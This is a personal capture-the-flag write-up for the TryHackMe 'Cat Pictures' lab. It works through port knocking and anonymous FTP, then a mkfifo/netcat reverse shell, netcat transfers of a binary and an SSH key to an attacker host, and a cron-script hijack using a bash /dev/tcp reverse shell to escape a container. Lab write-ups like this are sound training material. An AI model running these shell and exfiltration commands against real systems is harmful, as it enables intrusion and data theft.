---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Cat Pictures
# DESCRIPTION       . I made a forum where you can post cute cat pictures!
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/catpictures
```

```
sudo nmap -sSVC -T5 -p- 10.10.60.246 -oN cats
```

```
PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37436480d35a746281b7806b1a23d84a (RSA)
|   256 53c682efd27733efc13d9c1513540eb2 (ECDSA)
|_  256 ba97c323d4f2cc082ce12b3006189541 (ED25519)

2375/tcp filtered docker
4420/tcp open     nvm-express?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:

8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
|_http-title: Cat Pictures - Index page
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
```

#### PORT 21 

- Filtered, can't connect.

#### PORT 4420 

- Seems to be an interactive shell, but we don't have the credentials.

#### PORT 8080

- I noticed that there are 1 total registered users, and the only post on the forum is made by user `user`, so I assumed he must be the only account created. The post contains the following message

```
POST ALL YOUR CAT PICTURES HERE :)

Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

- I tried a lot of things after this, including fuzzing for potential directories but I had no clear path so I've decided to help myself with a writeup.

- The message in the post I've found should make us think of "[port knocking](https://en.wikipedia.org/wiki/Port_knocking)", something I wasn't familiar with upon this point. 

 - I've used [this](https://github.com/grongor/knock) tool to knock on ports `1111`, `2222`, `3333` and `4444`. 

- After this, considering the information found on wikipedia, I've scanned the target with nmap again.

- This time, the FTP service wasn't filtered anymore.

#### PORT 21

- I was able to login using `anonymous` and to download the only file available, `note.txt`.

```
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is {REDACTED}.
- catlover
```

#### PORT 4420 

- We're able to authenticate to this remote shell. However, we have very limited functionality. 
- `cd` is **NOT** working, as we were informed, but also a lot of other commands are missing. (even `mkdir`)

- Using `ls`, I found the following binaries on the system

```bash
ls /bin

bash
cat
echo
ls
nc
rm
sh
```

```bash
ls /usr/bin

mkfifo
touch
wget
```

- Also, there is one binary called `runme` in `/home/catlover` but it is password protected.

- I tried using `nc` to transfer the binary to my own system but it didn't work, so I've assumed this had something to do with the shell.

- If we use `/bin/bash`, we're unable to see any output. 
- So let's create a reverse shell first.

**ON ATTACKER BOX**

```
nc -nvlp 3132
```

**ON INTERACTIVE SHELL**

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc IP 3132 >/tmp/f
```

- Yes, this is from revshells. But notice that i've replaced `sh` with `bash`.

- Now that we have a "proper" reverse shell, we can transfer the `runme` binary using `nc`.

**ON ATTACKER BOX

```
nc -nvlp 5678 > runme
```

**ON REV SHELL**

```
nc -N attacker_IP 5678 < /home/catlover/runme
```

- Now that we have the binary locally, I've used `strings` to do a basic examination.

```
r{REDACTED}
Please enter yout password: 
Welcome, catlover! SSH key transfer queued! 
touch /tmp/gibmethesshkey
Access Denied
```

- The password can be found in plaintext, alongside some hints to the binary's functionality.

- It'll copy a (hopefully) private SSH key to `/tmp/gibmethesshkey`. Right? NO!!! :) I've lost a LOT of time on this, thinking that I got something wrong with `nc` not receiving the content of the file, but the actual `id_rsa` file is created in `/home/catlover` :| 

- I've transfered the `id_rsa` key using the same method as above and I've `chmod`'ed it to `600`. 

```
ssh -i key catlover@boxIP
```

```
root@7546fa2336d6:/# id
uid=0(root) gid=0(root) groups=0(root)
```

- The first flag is in `/root/flag.txt`.

- However, considering the hostname, `7546fa2336d6`, I was thinking that we might be in a container.

- After some time I found an unusual script in `/opt/clean`, called `clean.sh`.

```
#!/bin/bash

rm -rf /tmp/*
```

- So i've replaced the `rm` command with a `bash reverse shell`. 

```
bash -i >& /dev/tcp/IP/3132 0>&1
```

```
root@cat-pictures:~# id
uid=0(root) gid=0(root) groups=0(root)
```

- Notice the different host name. We're out of the container :) 

- The last flag is in `/root/root.txt`.
